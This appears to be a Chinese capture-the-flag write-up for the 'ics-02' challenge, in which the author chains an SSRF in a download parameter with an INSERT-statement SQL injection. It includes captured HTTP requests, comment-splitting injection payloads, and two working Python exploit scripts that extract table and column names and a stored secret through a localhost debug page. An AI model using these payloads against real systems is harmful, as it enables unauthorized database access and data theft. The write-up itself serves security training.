## ics-02

文档管理中心提示下载一个paper,是关于SSRF的

抓包查看过程

```
GET /download.php?dl=ssrf HTTP/1.1
Host: 111.198.29.45:46494
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:46494/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=206B255ED675C0EAF469D2BD32119F91
Connection: close
```

这个参数明示了SSRF了，试一下

```
GET /download.php?dl=233 HTTP/1.1
Host: 111.198.29.45:46494
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:46494/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=206B255ED675C0EAF469D2BD32119F91
Connection: close

HTTP/1.1 404 Not Found
Date: Fri, 31 Jan 2020 13:39:28 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.22
Content-Description: File Transfer
Content-Transfer-Encoding: binary
Content-Length: 63
Connection: close
Content-Type: application/octet-stream

File 233.pdf doesn't exist. Please report the error to admin...
```

可以这里的参数加了后缀.pdf

试了一下00截断%00截断都不行

用nikto扫了一下，没啥了

用御剑扫了一下目录，有个/secret

里面两个文件

![img](C:\Users\Eki\Documents\~9LC[NEC%NEG{_T~@T$]4YF.png)

fuzz一下发现

secret.php可以提交表单，在

```
http://111.198.29.45:46494/secret/secret.php?s=3&txtfirst_name=A&txtmiddle_name=B&txtLast_name=C&txtname_suffix=D&txtdob=E&txtdl_nmbr=123456789&txtRetypeDL=123456789&btnContinue2=Continue
```

中，各参数是可控的

且服务端返回

```
Registration Success
SUCCESSFULLY REGISTERED
Confirm that the following data is correct so we know it was stored correctly in our database.

Name: 12312, 213
DoB: 11/01/2000
```

提示这里可能存在sql注入点

问题来了怎么注呢........... 

和之前的SSRF又有什么关系呢？？？

注意到我们提交了9个参数

其中存进表里的应该是

```
txtfirst_name=a&txtmiddle_name=b&txtLast_name=c&txtname_suffix=d&txtdob=e&txtdl_nmbr=f&txtRetypeDL=f&btnContinue2=Continue
```

猜测后台的sql语句应该是

```sql
INSERT INTO <table> (A,B,C,D,E,F) VALUES ('a','b','c','d','e','f')
```

并且f是唯一的

那么我们可以利用注释符来进行注入 比如

```
a=A','B',("+sqlquery+"),'D'/*
e=*/,'E
```

拼接后

```sql
INSERT INTO <table> (A,B,C,D,E,F) VALUES ('A','B',("+sqlquery+"),'D'/*','c','d','*/,'E','f')
```

可以利用python的request构造"Exp"：

```python
import requests
import random

url = 'http://111.198.29.45:46494/secret/secret.php?'

sqlquery = "version()"

id = random.randint(1, 10000000)

payload = {
    "s": "3",
    "txtfirst_name": "A','B',("+sqlquery+"),'D'/*",
    "txtmiddle_name": "B",
    "txtLast_name": "C",
    "txtname_suffix": "D",
    "txtdob": "*/,'31/01/2020",
    "txtdl_nmbr": id,
    "txtRetypeDL": id
    }


r = requests.get(url, params=payload)
print(r.text)
```

但是，返回的还是那个东西....

```
Registration Success
SUCCESSFULLY REGISTERED
Confirm that the following data is correct so we know it was stored correctly in our database.

Name: C, A','B',(version()),'D'/*
DoB: */,'31/01/2020
```

注释里提示了

```html
<!-- <a href="debug.php">#</a> -->
```

但是前面那个secret_debug.php显示ip无权访问

修改XFF也不行

应该就是这里SSRF了

利用之前download.php的参数

可以构造Exp

```python
import requests
import random
import urllib

url = 'http://111.198.29.45:46494/download.php'

#sqlquery = "version()"
#sqlquery = "database()"
#sqlquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1"
#sqlquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1"
#sqlquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1"
sqlquery = "select value from cetcYssrf LIMIT 1"

qid = random.randint(1, 10000000)

d = ('http://127.0.0.1/secret/secret_debug.php?' +
        urllib.parse.urlencode({
            "s": "3",
            "txtfirst_name": "A','B',("+sqlquery+"),'D'/*",
            "txtmiddle_name": "B",
            "txtLast_name": "C",
            "txtname_suffix": "D",
            "txtdob": "*/,'31/01/2020",
            "txtdl_nmbr": qid,
            "txtRetypeDL": qid
            }) + "&")
#注意？号的使用

r = requests.get(url, params={"dl": d})
print(r.text)
```

### 参考资料

SSRF攻击：

[https://xz.aliyun.com/t/2115](https://xz.aliyun.com/t/2115)

本题Poc的构造:

[https://www.guildhab.top/?p=708](https://www.guildhab.top/?p=708)